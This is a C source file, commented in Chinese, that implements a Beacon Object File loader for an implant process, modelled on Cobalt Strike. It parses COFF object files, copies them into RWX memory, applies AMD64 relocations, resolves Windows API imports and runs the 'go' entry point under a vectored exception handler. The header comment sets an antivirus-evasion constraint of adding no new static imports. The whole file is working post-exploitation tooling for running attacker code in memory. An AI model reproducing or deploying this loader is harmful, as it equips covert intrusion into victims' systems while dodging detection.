/*
 * csdev :: bof.c  --  Beacon Object File (COFF) 内存加载器
 * ==========================================================================
 * 把 MSVC/mingw 生成的 COFF 目标文件 (.o) 在植入体进程内加载并执行。
 *
 * 流程: 解析 COFF 头 -> 一次性分配可执行内存 -> 逐节拷贝 -> 解析符号表 ->
 *       应用 AMD64 重定位 -> 查找入口 go/_go -> 调用 -> 全部释放
 *
 * 免杀硬约束: 只使用 kernel32 的 VirtualAlloc / VirtualFree / LoadLibraryA /
 * GetProcAddress / AddVectoredExceptionHandler, 不新增静态导入。
 *
 * ------------------------------------------------------------------ 限制
 * 1) 仅支持 AMD64 (IMAGE_FILE_MACHINE_AMD64 = 0x8664) 目标文件;
 *    x86 COFF 返回 BOF_ERR_MACHINE。
 * 2) MinGW/GCC 不支持 MSVC 的 __try/__except 语法, 异常兜底改用
 *    AddVectoredExceptionHandler + setjmp/longjmp。它只能把控制流救回本函数,
 *    不保证被跳过的栈帧已析构, 对栈溢出与二次异常无效。
 *    对不可信 BOF 的强隔离必须靠独立进程, 见交付报告。
 * 3) 所有节落在同一块 RWX 内存 (PAGE_EXECUTE_READWRITE) 里 —— 与 CS 对 BOF
 *    的处理一致, 因为 BOF 常有自修改与跳转表需求。连续布局同时保证
 *    ADDR32 / REL32 这类窄重定位不会因节间距过大而溢出。
 * ==========================================================================
 */
#include <windows.h>
#include <setjmp.h>
#include <stdio.h>
#include <string.h>

#include "bof.h"
#include "bof_api.h"

#if defined(__GNUC__)
#pragma GCC diagnostic ignored "-Wstrict-aliasing"
#endif

/* ==================================================== COFF 常量与结构 */

#define COFF_MACHINE_AMD64   0x8664u

#define AMD64_REL_ADDR64     0x0001u
#define AMD64_REL_ADDR32     0x0002u
#define AMD64_REL_ADDR32NB   0x0003u
#define AMD64_REL_REL32      0x0004u

#define BOF_MAX_SEC          32
#define BOF_NAME_MAX         128

#pragma pack(push, 1)
typedef struct {
    unsigned char  name[8];
    unsigned int   vsize;
    unsigned int   vaddr;
    unsigned int   rawsize;
    unsigned int   rawptr;
    unsigned int   relptr;
    unsigned int   lnoptr;
    unsigned short nrel;
    unsigned short nlin;
    unsigned int   chars;
} coff_sec_raw;                                  /* 40 字节 */

typedef struct {
    unsigned char  name[8];
    unsigned int   value;
    short          secnum;
    unsigned short type;
    unsigned char  sclass;
    unsigned char  naux;
} coff_sym_raw;                                  /* 18 字节 */

typedef struct {
    unsigned int   vaddr;
    unsigned int   symndx;
    unsigned short type;
} coff_reloc_raw;                                /* 10 字节 */
#pragma pack(pop)

/* ---------------------------------------------------------- 运行时视图 */

typedef struct {
    char           name[16];
    unsigned int   vsize;
    unsigned int   rawsize;
    unsigned int   rawptr;
    unsigned int   relptr;
    unsigned int   nrel;
    unsigned int   chars;
    unsigned char *base;
} bof_sec_rt;

typedef struct {
    char           name[BOF_NAME_MAX];
    unsigned int   value;
    short          secnum;
    unsigned char  sclass;
    unsigned char  naux;
    unsigned char *res;
    int            state;        /* 0 未解析 / 1 已解析 / -1 失败 */
} bof_sym_rt;

typedef struct {
    unsigned char *mem;
    unsigned int   memsz;
    unsigned int   sec_n;
    bof_sec_rt     sec[BOF_MAX_SEC];
    bof_sym_rt    *sym;
    unsigned int   sym_n;
    /* __imp_ 间接槽区。
     * COFF 里 __imp_XXX 的语义是"导入地址表项", BOF 用
     *   call qword ptr [rip+disp]   (ff 15 / 48 8b 05 ...)
     * 间接调用它。因此重定位必须指向一个 **存放函数指针的槽**,
     * 而不是函数本身的地址 —— 直接写函数地址会让 call 把函数首 8
     * 字节当成指针解引用, 立刻崩溃。 */
    unsigned char *slots;
    unsigned int   slot_cap;
    unsigned int   slot_used;
} bof_image;

/* ------------------------------------------------------------ 诊断回调 */

static bof_diag_fn g_diag;
static char        g_diagbuf[320];

void bof_set_diag(bof_diag_fn fn)
{
    g_diag = fn;
}

/* 统一的两参数格式化: 第二个参数是字符串或十六进制数 */
static void diag_s(const char *fmt, const char *s, unsigned int v)
{
    if (!g_diag) return;
    snprintf(g_diagbuf, sizeof(g_diagbuf), fmt, s, v);
    g_diag(g_diagbuf);
}

static void diag_m(const char *msg)
{
    if (g_diag) g_diag(msg);
}

/* ------------------------------------------------------------- 读字节序 */
/* COFF 内部字段一律小端 (与 BOF 参数块的大端不同, 后者见 bof_api.c 说明)。 */

static unsigned int rd_u16(const unsigned char *p)
{
    return (unsigned int)p[0] | ((unsigned int)p[1] << 8);
}

static unsigned int rd_u32(const unsigned char *p)
{
    return (unsigned int)p[0] | ((unsigned int)p[1] << 8) |
           ((unsigned int)p[2] << 16) | ((unsigned int)p[3] << 24);
}

static void wr_u32(unsigned char *p, unsigned int v)
{
    p[0] = (unsigned char)(v & 0xFF);
    p[1] = (unsigned char)((v >> 8) & 0xFF);
    p[2] = (unsigned char)((v >> 16) & 0xFF);
    p[3] = (unsigned char)((v >> 24) & 0xFF);
}

static unsigned long long rd_u64(const unsigned char *p)
{
    return (unsigned long long)rd_u32(p) | ((unsigned long long)rd_u32(p + 4) << 32);
}

static void wr_u64(unsigned char *p, unsigned long long v)
{
    wr_u32(p, (unsigned int)(v & 0xFFFFFFFFu));
    wr_u32(p + 4, (unsigned int)(v >> 32));
}

static int bounds_ok(const unsigned char *coff, unsigned int cofflen,
                     unsigned int off, unsigned int need)
{
    (void)coff;                                  /* 仅按长度做边界判断 */
    return (off <= cofflen) && (need <= cofflen - off);
}

/* =============================================================== 符号名 */
/* COFF 符号名: 前 4 字节全 0 时, 后 4 字节是字符串表内的偏移。
 * 字符串表位于 符号表起点 + 符号数*18, 首 4 字节为表总长度。 */

static void sym_name_fill(const unsigned char *coff, unsigned int cofflen,
                          unsigned int strtab, const unsigned char *raw,
                          char *out, unsigned int cap)
{
    unsigned int i;

    if (cap == 0) return;
    out[0] = 0;
    if (cap == 1) return;

    if (raw[0] == 0 && raw[1] == 0 && raw[2] == 0 && raw[3] == 0) {
        unsigned int off = rd_u32(raw + 4);
        unsigned int p, n = 0;

        if (off == 0) return;                    /* 偏移 0 表示"无名" */
        p = strtab + off;
        if (!bounds_ok(coff, cofflen, p, 1)) return;
        while (p + n < cofflen && coff[p + n] != 0 && n < cap - 1) {
            out[n] = (char)coff[p + n];
            n++;
        }
        out[n] = 0;
        return;
    }

    for (i = 0; i < 8 && i < cap - 1; i++) {
        if (raw[i] == 0) break;
        out[i] = (char)raw[i];
    }
    out[i] = 0;
}

/* ==================================================== Windows API 解析 */
/* 实际解析在 bof_api.c 里 (bof_resolve_winapi), 那边维护模块句柄缓存。
 * 符号形如 __imp_<MODULE>$<FUNC> 或 __imp__<MODULE>$<FUNC>@<n>,
 * 模块名不带 .dll; 函数名可能带 x86 的 stdcall @N 后缀, 由被调方剥离。 */

static void *resolve_external(const char *rawname)
{
    const char *p = rawname;
    const char *dollar;
    char        mod[64];
    unsigned int n;

    if (strncmp(p, "__imp__", 7) == 0)      p += 7;
    else if (strncmp(p, "__imp_", 6) == 0)  p += 6;

    dollar = strchr(p, '$');
    if (!dollar) {
        /* 无模块前缀 => Beacon API (__imp_BeaconPrintf / __imp__toWideChar) */
        return bof_api_lookup(p);
    }

    n = (unsigned int)(dollar - p);
    if (n == 0 || n >= sizeof(mod)) return NULL;
    memcpy(mod, p, n);
    mod[n] = 0;
    return bof_resolve_winapi(mod, dollar + 1);
}

/* ============================================================ 加载镜像 */

static int img_load(const unsigned char *coff, unsigned int cofflen, bof_image *img)
{
    unsigned int machine, nsec, symptr, nsym, optsz, strtab;
    unsigned int i, total = 0, cur;

    memset(img, 0, sizeof(*img));

    if (!bounds_ok(coff, cofflen, 0, BOF_COFF_HDR_SIZE)) return BOF_ERR_COFF;

    machine = rd_u16(coff);
    nsec    = rd_u16(coff + 2);
    symptr  = rd_u32(coff + 8);
    nsym    = rd_u32(coff + 12);
    optsz   = rd_u16(coff + 16);

    if (machine != COFF_MACHINE_AMD64) return BOF_ERR_MACHINE;
    if (nsec == 0 || nsec > BOF_MAX_SEC) return BOF_ERR_COFF;
    if (optsz != 0) return BOF_ERR_COFF;
    if (!bounds_ok(coff, cofflen, BOF_COFF_HDR_SIZE, nsec * BOF_SEC_HDR_SIZE))
        return BOF_ERR_COFF;

    img->sec_n = nsec;

    /* 字符串表位置: 节名若写成 "/<十进制偏移>" 就指向这里 (GCC 对超过 8 字符
     * 的节名如 .rdata$zzz 会这么写; MSVC 通常不用)。 */
    strtab = (nsym && bounds_ok(coff, cofflen, symptr, nsym * BOF_SYM_SIZE))
             ? symptr + nsym * BOF_SYM_SIZE : 0;

    /* -------- 第一遍: 解析节头, 校验范围, 累计内存 -------- */
    for (i = 0; i < nsec; i++) {
        const unsigned char *p = coff + BOF_COFF_HDR_SIZE + i * BOF_SEC_HDR_SIZE;
        unsigned int k = 0;
        unsigned int need;

        if (p[0] == '/' && p[1] >= '0' && p[1] <= '9' && strtab) {
            unsigned int off = 0, q, j = 1;
            while (j < 8 && p[j] >= '0' && p[j] <= '9') {
                off = off * 10u + (unsigned int)(p[j] - '0');
                j++;
            }
            q = strtab + off;
            if (bounds_ok(coff, cofflen, q, 1)) {
                while (q + k < cofflen && coff[q + k] && k < sizeof(img->sec[i].name) - 1) {
                    img->sec[i].name[k] = (char)coff[q + k];
                    k++;
                }
            }
        } else {
            while (k < 8 && p[k] != 0) { img->sec[i].name[k] = (char)p[k]; k++; }
        }
        img->sec[i].name[k] = 0;

        img->sec[i].vsize   = rd_u32(p + 8);
        img->sec[i].rawsize = rd_u32(p + 16);
        img->sec[i].rawptr  = rd_u32(p + 20);
        img->sec[i].relptr  = rd_u32(p + 24);
        img->sec[i].nrel    = rd_u16(p + 32);
        img->sec[i].chars   = rd_u32(p + 36);

        if (img->sec[i].rawsize &&
            !bounds_ok(coff, cofflen, img->sec[i].rawptr, img->sec[i].rawsize)) {
            diag_s("[-] BOF: 节 %s 的原始数据越界", img->sec[i].name, 0);
            return BOF_ERR_COFF;
        }
        if (img->sec[i].nrel &&
            !bounds_ok(coff, cofflen, img->sec[i].relptr,
                       img->sec[i].nrel * BOF_RELOC_SIZE)) {
            diag_s("[-] BOF: 节 %s 的重定位表越界", img->sec[i].name, 0);
            return BOF_ERR_COFF;
        }

        need = img->sec[i].rawsize;
        if (img->sec[i].vsize > need) need = img->sec[i].vsize;
        if (need == 0) need = 1;                 /* 占位, 避免零长节共用地址 */

        total = (total + 15u) & ~15u;            /* 16 字节对齐 */
        total += need;
    }

    img->mem = (unsigned char *)VirtualAlloc(NULL, total,
                                             MEM_COMMIT | MEM_RESERVE,
                                             PAGE_EXECUTE_READWRITE);
    if (!img->mem) return BOF_ERR_NOMEM;
    img->memsz = total;

    /* -------- 第二遍: 逐节拷贝 -------- */
    cur = 0;
    for (i = 0; i < nsec; i++) {
        unsigned int need = img->sec[i].rawsize;
        if (img->sec[i].vsize > need) need = img->sec[i].vsize;
        if (need == 0) need = 1;

        cur = (cur + 15u) & ~15u;
        img->sec[i].base = img->mem + cur;

        if (img->sec[i].rawsize) {
            memcpy(img->sec[i].base, coff + img->sec[i].rawptr, img->sec[i].rawsize);
        }
        if (img->sec[i].vsize > img->sec[i].rawsize) {
            memset(img->sec[i].base + img->sec[i].rawsize, 0,
                   img->sec[i].vsize - img->sec[i].rawsize);
        }
        cur += need;
    }

    /* -------- 符号表 --------
     * 关键: 重定位里的 r_symndx 索引的是 **原始符号表**(含辅助记录)。
     * 因此这里必须保持一一对应 —— 每个原始索引 i 都占一个槽位, 辅助记录
     * 的槽位标记为 state = -2 (不可解析)。任何"压缩数组"的做法都会让
     * r_symndx 指向错误的符号。 */
    if (nsym) {
        if (!bounds_ok(coff, cofflen, symptr, nsym * BOF_SYM_SIZE)) return BOF_ERR_COFF;
        strtab = symptr + nsym * BOF_SYM_SIZE;

        img->sym = (bof_sym_rt *)LocalAlloc(LPTR, (SIZE_T)nsym * sizeof(bof_sym_rt));
        if (!img->sym) return BOF_ERR_NOMEM;

        for (i = 0; i < nsym; i++) {
            const unsigned char *p = coff + symptr + i * BOF_SYM_SIZE;
            bof_sym_rt *s = &img->sym[i];
            unsigned int a;

            if (s->state == -2) continue;            /* 已被标记为辅助记录 */

            sym_name_fill(coff, cofflen, strtab, p, s->name, BOF_NAME_MAX);
            s->value  = rd_u32(p + 8);
            s->secnum = (short)rd_u16(p + 12);
            s->sclass = p[16];
            s->naux   = p[17];
            s->state  = 0;
            s->res    = NULL;

            for (a = 1; a <= (unsigned int)s->naux && i + a < nsym; a++) {
                img->sym[i + a].state   = -2;
                img->sym[i + a].name[0] = 0;
            }
        }
        img->sym_n = nsym;
    }

    /* -------- __imp_ 间接槽区 -------- */
    img->slot_cap  = nsym * 8u + 64u;
    img->slot_used = 0;
    img->slots = (unsigned char *)VirtualAlloc(NULL, img->slot_cap,
                                               MEM_COMMIT | MEM_RESERVE,
                                               PAGE_READWRITE);
    if (!img->slots) return BOF_ERR_NOMEM;

    return BOF_OK;
}

/* 每个 __imp_ 符号分配一个 8 字节槽, 槽内存放真实函数地址, 返回槽的地址。 */
static unsigned char *alloc_slot(bof_image *img, void *fn)
{
    unsigned char *p;

    if (!img->slots || img->slot_used + 8u > img->slot_cap) return NULL;
    p = img->slots + img->slot_used;
    img->slot_used += 8u;
    *(void **)p = fn;
    return p;
}

/* 判断符号名是否带 __imp_ / __imp__ 间接前缀 (即需要 IAT 槽) */
static int is_imp_symbol(const char *n)
{
    return (strncmp(n, "__imp__", 7) == 0) || (strncmp(n, "__imp_", 6) == 0);
}

/* ======================================================== 符号地址解析 */

static unsigned char *resolve_symbol(bof_image *img, unsigned int idx)
{
    bof_sym_rt *s;

    if (!img->sym || idx >= img->sym_n) return NULL;
    s = &img->sym[idx];

    if (s->state == 1) return s->res;
    if (s->state == -2) return NULL;             /* 辅助记录: 不可解析, 不报错 */
    if (s->state == -1) return NULL;

    if (s->secnum > 0) {
        unsigned int si = (unsigned int)s->secnum - 1u;
        if (si < img->sec_n) {
            s->res   = img->sec[si].base + s->value;
            s->state = 1;
            return s->res;
        }
        s->state = -1;
        return NULL;
    }

    if (s->secnum == -1) {                       /* IMAGE_SYM_ABSOLUTE */
        s->res   = (unsigned char *)(ULONG_PTR)s->value;
        s->state = 1;
        return s->res;
    }

    if (s->secnum == 0) {                        /* 外部符号 */
        void *fn = resolve_external(s->name);
        if (fn) {
            if (is_imp_symbol(s->name)) {
                /* __imp_ 需要 IAT 槽: 调用方是 call qword ptr [rip+disp] */
                unsigned char *slot = alloc_slot(img, fn);
                if (!slot) {
                    diag_s("[-] BOF: __imp_ 槽区耗尽: %s", s->name, 0);
                    s->state = -1;
                    return NULL;
                }
                s->res = slot;
            } else {
                s->res = (unsigned char *)fn;
            }
            s->state = 1;
            return s->res;
        }
        diag_s("[-] BOF: 外部符号无法解析: %s", s->name, 0);
        s->state = -1;
        return NULL;
    }

    diag_s("[-] BOF: 引用了调试/无效符号: %s", s->name, 0);
    s->state = -1;
    return NULL;
}

/* ============================================================== 重定位 */

static int apply_relocs(bof_image *img, const unsigned char *coff, unsigned int cofflen)
{
    unsigned int  i, r;
    unsigned long long image_base = (unsigned long long)(ULONG_PTR)img->mem;

    for (i = 0; i < img->sec_n; i++) {
        unsigned int nrel = img->sec[i].nrel;
        if (nrel == 0) continue;

        for (r = 0; r < nrel; r++) {
            unsigned int roff = img->sec[i].relptr + r * BOF_RELOC_SIZE;
            unsigned int vaddr, symndx, type;
            unsigned char *patch;
            unsigned char *target;
            unsigned long long t, v;

            if (!bounds_ok(coff, cofflen, roff, BOF_RELOC_SIZE)) return BOF_ERR_COFF;

            vaddr  = rd_u32(coff + roff);
            symndx = rd_u32(coff + roff + 4);
            type   = rd_u16(coff + roff + 8);

            if (symndx >= img->sym_n) {
                diag_s("[-] BOF: 节 %s 的重定位引用了越界符号索引",
                       img->sec[i].name, symndx);
                return BOF_ERR_COFF;
            }
            if (vaddr >= img->memsz) {
                diag_s("[-] BOF: 节 %s 的重定位偏移越界", img->sec[i].name, vaddr);
                return BOF_ERR_COFF;
            }

            patch  = img->sec[i].base + vaddr;
            target = resolve_symbol(img, symndx);
            if (!target) return BOF_ERR_SYMBOL;

            t = (unsigned long long)(ULONG_PTR)target;

            /* 四种类型都"读出原有加数再加新值": COFF 内联重定位的加数就写在
             * 修补位置, 初值为 0 时结果不受影响。 */
            switch (type) {
            case AMD64_REL_ADDR64:
                wr_u64(patch, rd_u64(patch) + t);
                break;

            case AMD64_REL_ADDR32:
                v = (unsigned long long)(unsigned int)rd_u32(patch) + t;
                wr_u32(patch, (unsigned int)v);
                break;

            case AMD64_REL_ADDR32NB:
                v = (unsigned long long)(unsigned int)rd_u32(patch) + (t - image_base);
                wr_u32(patch, (unsigned int)v);
                break;

            case AMD64_REL_REL32:
                /* 目标 - (修补点 + 4) */
                v = (unsigned long long)(long long)(int)rd_u32(patch);
                v += t - ((unsigned long long)(ULONG_PTR)patch + 4ull);
                wr_u32(patch, (unsigned int)v);
                break;

            case 0x0005u: case 0x0006u: case 0x0007u:
            case 0x0008u: case 0x0009u:
                /* IMAGE_REL_AMD64_REL32_1 .. REL32_5: 与 REL32 同形, 只是
                 * "下一条指令地址" 的基准再往后偏 N 字节 (N = type - 4),
                 * 用于 `call/jmp` 后跟立即数内联的场景。真实 CS 4.7 样本
                 * interfaces.x64.o 就用到 REL32_1。 */
                v = (unsigned long long)(long long)(int)rd_u32(patch);
                v += t - ((unsigned long long)(ULONG_PTR)patch
                          + 4ull + (unsigned long long)(type - 4u));
                wr_u32(patch, (unsigned int)v);
                break;

            default:
                /* 任务硬性要求: 不支持的类型必须报错, 不得静默跳过 */
                diag_s("[-] BOF: 不支持的重定位类型 (节 %s) type=0x%04x",
                       img->sec[i].name, type);
                return BOF_ERR_RELOC;
            }
        }
    }
    return BOF_OK;
}

/* ============================================================ 异常兜底 */

static jmp_buf      g_jmp;
static volatile LONG g_guard;
static PVOID        g_veh;

static LONG CALLBACK bof_veh(EXCEPTION_POINTERS *ep)
{
    DWORD code;

    if (!g_guard) return EXCEPTION_CONTINUE_SEARCH;

    code = ep->ExceptionRecord->ExceptionCode;
    if (code == EXCEPTION_ACCESS_VIOLATION        ||
        code == EXCEPTION_ILLEGAL_INSTRUCTION     ||
        code == EXCEPTION_PRIV_INSTRUCTION        ||
        code == EXCEPTION_INT_DIVIDE_BY_ZERO      ||
        code == EXCEPTION_IN_PAGE_ERROR           ||
        code == EXCEPTION_DATATYPE_MISALIGNMENT) {
        longjmp(g_jmp, 1);
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

/* ============================================================== 入口查找 */
/* CS 的 pe/OBJExecutable.getEntryPoint() 接受 "go" 与 "_go" 两种拼写。 */

static unsigned char *find_entry(bof_image *img, const char *entry_name)
{
    unsigned int i;

    if (!img->sym) return NULL;

    for (i = 0; i < img->sym_n; i++) {
        const char *n = img->sym[i].name;
        int hit;

        if (n[0] == 0) continue;

        hit = (strcmp(n, entry_name) == 0) ||
              (n[0] == '_' && strcmp(n + 1, entry_name) == 0) ||
              (entry_name[0] == '_' && strcmp(n, entry_name + 1) == 0);
        if (!hit) continue;

        return resolve_symbol(img, i);
    }
    return NULL;
}

/* ================================================================ 释放 */

static void img_free(bof_image *img)
{
    if (img->sym)   { LocalFree(img->sym); img->sym = NULL; }
    if (img->slots) { VirtualFree(img->slots, 0, MEM_RELEASE); img->slots = NULL; }
    if (img->mem)   { VirtualFree(img->mem, 0, MEM_RELEASE); img->mem = NULL; }
    img->memsz = 0;
    img->slot_cap = 0;
    img->slot_used = 0;
}

/* ================================================================ 出口 */

int bof_execute(const unsigned char *coff, unsigned int cofflen,
                const unsigned char *args, unsigned int argslen,
                char *out, unsigned int outcap, unsigned int *outlen)
{
    typedef void (__attribute__((ms_abi)) *bof_entry_fn)(char *, int);

    bof_image      img;
    int            rc;
    unsigned char *entry;
    /* volatile: 这两个变量跨越 setjmp/longjmp 边界, 必须避免被寄存器缓存 */
    char * volatile argbuf  = NULL;
    volatile int   crashed  = 0;

    if (outlen) *outlen = 0;
    if (!coff || cofflen < BOF_COFF_HDR_SIZE) return BOF_ERR_ARG;

    rc = img_load(coff, cofflen, &img);
    if (rc != BOF_OK) { img_free(&img); return rc; }

    rc = apply_relocs(&img, coff, cofflen);
    if (rc != BOF_OK) { img_free(&img); return rc; }

    entry = find_entry(&img, "go");
    if (!entry) {
        diag_m("[-] BOF: 未找到入口符号 go / _go");
        img_free(&img);
        return BOF_ERR_ENTRY;
    }

    if (args && argslen) {
        argbuf = (char *)VirtualAlloc(NULL, argslen,
                                      MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!argbuf) { img_free(&img); return BOF_ERR_NOMEM; }
        memcpy(argbuf, args, argslen);
    }

    bof_sink_begin(out, outcap);

    if (!g_veh) g_veh = AddVectoredExceptionHandler(1, bof_veh);

    if (setjmp(g_jmp) == 0) {
        g_guard = 1;
        ((bof_entry_fn)entry)(argbuf, (int)argslen);
        g_guard = 0;
    } else {
        g_guard = 0;
        crashed = 1;
    }

    if (outlen) *outlen = bof_sink_end();
    else        (void)bof_sink_end();

    if (argbuf) VirtualFree(argbuf, 0, MEM_RELEASE);
    img_free(&img);

    if (crashed) { diag_m("[-] BOF: 执行期间触发硬件异常"); return BOF_ERR_CRASH; }
    return BOF_OK;
}

/* ========================================================= 静态探测入口 */
/* 只解析不执行, 供审计工具统计样本 (tools/bof_test.c 的 scan 模式)。 */

int bof_probe(const unsigned char *coff, unsigned int cofflen,
              unsigned int *nsec, unsigned int *nrel,
              char *entry, unsigned int entrycap)
{
    bof_image img;
    int rc;
    unsigned int i;

    if (nsec) *nsec = 0;
    if (nrel) *nrel = 0;
    if (entry && entrycap) entry[0] = 0;
    if (!coff || cofflen < BOF_COFF_HDR_SIZE) return BOF_ERR_ARG;

    rc = img_load(coff, cofflen, &img);
    if (rc != BOF_OK) { img_free(&img); return rc; }

    if (nsec) *nsec = img.sec_n;
    if (nrel) {
        unsigned int t = 0;
        for (i = 0; i < img.sec_n; i++) t += img.sec[i].nrel;
        *nrel = t;
    }

    if (entry && entrycap) {
        for (i = 0; i < img.sym_n; i++) {
            const char *n = img.sym[i].name;
            if (strcmp(n, "go") == 0 || strcmp(n, "_go") == 0) {
                unsigned int j = 0;
                while (n[j] && j < entrycap - 1) { entry[j] = n[j]; j++; }
                entry[j] = 0;
                break;
            }
        }
    }

    /* 完整走一遍符号解析与重定位, 暴露失败清单 */
    rc = apply_relocs(&img, coff, cofflen);

    img_free(&img);
    return rc;
}
